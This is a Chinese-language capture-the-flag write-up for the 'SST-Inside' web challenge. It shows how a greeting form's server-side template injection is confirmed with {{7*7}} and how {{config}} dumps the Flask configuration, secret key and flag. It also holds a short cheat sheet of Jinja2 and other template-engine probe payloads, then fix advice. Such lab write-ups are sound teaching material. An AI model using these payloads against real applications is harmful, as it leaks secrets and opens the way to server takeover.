# SST-Inside - CTF Web 解题报告

## 题目信息

- **题目名称**: SST-Inside
- **题目类型**: Web 安全
- **作者**: dr3dd
- **题目链接**: https://sst-inside.chall.edgesecurity.team/
- **Flag格式**: EdgeCTF{random_string_here}

## 题目描述

题目提示："Sometimes the server tells you more than it should..."（有时服务器会透露比应该透露的更多信息）

## 解题过程

### 1. 初步侦察

访问题目网站后，发现这是一个简单的Web应用，包含以下页面：
- 主页 (/)
- 问候服务 (/greet)
- 关于页面 (/about)

主页上声称使用了"最新的安全实践"，包括：
- 高级输入验证
- 安全模板渲染
- 受保护的配置
- 无信息泄露

### 2. 发现关键功能点

在 `/greet` 页面发现了一个表单，允许用户输入名字并生成个性化问候语。

页面上有一个重要的提示：
> "我们的高级模板系统可以处理各种类型的输入。尝试使用不同的格式进行实验！"
> 
> "有时服务器会透露比预期更多的信息..."

这强烈暗示可能存在**服务器端模板注入（SSTI）**漏洞。

### 3. 测试 SSTI 漏洞

**测试 Payload 1**: 普通输入
```
输入: test
输出: Hello, test!
```

**测试 Payload 2**: 模板表达式
```
输入: {{7*7}}
输出: Hello, 49!
```

✅ **确认漏洞存在！** 模板表达式 `{{7*7}}` 被成功执行并返回了计算结果 `49`，这证实了存在SSTI漏洞。

### 4. 利用 SSTI 获取配置信息

根据题目提示"服务器会透露更多信息"，推测flag可能存储在服务器配置中。

在Flask/Jinja2模板引擎中，可以通过 `config` 对象访问应用配置。

**利用 Payload**:
```
输入: {{config}}
```

**返回结果**:
```html
Hello, <Config {
    'DEBUG': False, 
    'TESTING': False, 
    'SECRET_KEY': 'super_secret_key_for_ctf', 
    ...
    'FLAG': 'EdgeCTF{ssti_config_l3ak_d4ng3r0us}'
}>!
```

🎉 **成功获取 Flag！**

## 最终答案

```
EdgeCTF{ssti_config_l3ak_d4ng3r0us}
```

## 漏洞分析

### 漏洞类型
**服务器端模板注入（Server-Side Template Injection, SSTI）**

### 漏洞成因
1. 应用直接将用户输入嵌入到模板中进行渲染
2. 没有对用户输入进行适当的过滤和转义
3. 敏感信息（Flag）被存储在应用配置对象中
4. 模板引擎允许通过特定语法访问应用内部对象

### 危害等级
🔴 **高危**

SSTI漏洞可以导致：
- 信息泄露（如本题中的配置泄露）
- 远程代码执行（RCE）
- 服务器完全被控制

### 相关知识点

#### SSTI 常见测试Payload

**Jinja2/Flask**:
```python
{{7*7}}                    # 基础测试
{{config}}                 # 访问配置
{{config.items()}}         # 配置详情
{{''.__class__}}           # 访问类对象
```

**其他模板引擎**:
```
${7*7}                     # FreeMarker, Velocity
<%= 7*7 %>                 # ERB (Ruby)
{{ 7*7 }}                  # Twig (PHP)
```

## 修复建议

1. **输入验证**: 对所有用户输入进行严格的白名单验证
2. **使用安全的渲染方式**: 避免直接将用户输入传递给模板引擎
3. **配置分离**: 敏感信息不应存储在应用配置中，应使用环境变量或密钥管理服务
4. **最小权限原则**: 限制模板引擎可访问的对象和方法
5. **沙箱环境**: 如果必须使用用户输入，考虑在沙箱环境中执行

## 参考资料

- [OWASP - Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## 总结

这道题目很好地演示了SSTI漏洞的危害性。通过简单的模板注入，攻击者可以访问应用的内部配置，泄露敏感信息。在实际环境中，SSTI漏洞甚至可能导致远程代码执行，完全控制服务器。

**关键教训**:
- 永远不要信任用户输入
- 不要直接在模板中渲染未经过滤的用户数据
- 敏感信息应该得到妥善保护，不应暴露在可访问的配置对象中

---

*解题时间: 2025年12月12日*
*工具: Microsoft Edge Puppeteer*